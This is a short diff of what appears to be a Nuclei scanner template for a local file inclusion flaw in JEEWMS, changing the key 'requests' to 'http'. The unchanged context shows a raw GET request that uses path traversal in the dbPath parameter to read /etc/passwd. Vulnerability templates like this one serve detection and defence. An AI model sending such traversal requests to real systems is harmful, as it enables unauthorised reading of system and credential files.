@@ -7,7 +7,7 @@ info:
   reference: https://mp.weixin.qq.com/s/ylOuWc8elD2EtM-1LiJp9g
   tags: jeewms,lfi
 
-requests:
+http:
   - raw:
       - | #linux
         GET /systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd HTTP/1.1
